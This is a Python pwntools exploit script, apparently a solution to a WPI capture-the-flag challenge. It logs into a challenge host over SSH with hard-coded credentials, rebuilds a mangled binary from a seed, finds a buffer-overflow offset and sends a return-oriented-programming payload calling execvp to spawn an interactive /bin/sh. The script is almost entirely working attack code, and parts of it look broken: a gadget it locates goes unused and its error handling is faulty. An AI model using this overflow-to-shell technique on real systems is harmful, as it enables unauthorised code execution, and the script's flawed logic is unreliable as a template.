#!/usr/bin/python

from pwn import *
import sys
import os
import time

binary = './bin'
brkpts = '''
'''

elf = ELF("new_bin")
libc = ELF("./libc6_2.31-0ubuntu9.3_amd64.so")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

def getoffset():
    p = process("./bin", env = {"SOURCE1_PW" : "HuN7erTw0"})
    p.sendline(cyclic(800, n=8))
    p.wait()
    core = p.corefile
    return cyclic_find(core.read(core.rsp, 8), n=8)
    p.close()

def pwn(io):
    reu("seed ")
    seed = int(rl())
    print(seed)
    os.system("/usr/local/bin/elf-mangler --seed {} -sbCMSr --shimalign 1 source_obj ./mangled".format(str(seed)))
    os.system("gcc -no-pie mangled -o bin")
    elf = ELF("bin")
    pop_rdi = int(os.popen("ROPgadget --binary bin | grep 'pop rdi'", "r").read().split(" ")[0], 16)
    pop_rsir15 = int(os.popen("ROPgadget --binary bin | grep 'pop rsi'", "r").read().split(" ")[0], 16)
    execvp = elf.plt['execvp']
    
    bss = elf.bss() + 0x500
    
    offset = getoffset()
    assert offset != -1

    payload = "/bin/sh\x00" + "a"*(offset-8) + flat([
        pop_rsir15, 0, 0, execvp
    ])
    sla("tt4248106/\r\n", payload)
    io.interactive()
    
if __name__ == "__main__":
    try:
        s = ssh(host='fj10fnannlf08afn32.wpictf.xyz', user='ctf',password='mangleme', port = 54732)
        io = s.shell("/bin/sh")
        context.noptrace = True
        pwn(io)
    except:
        s.close()
        io.close()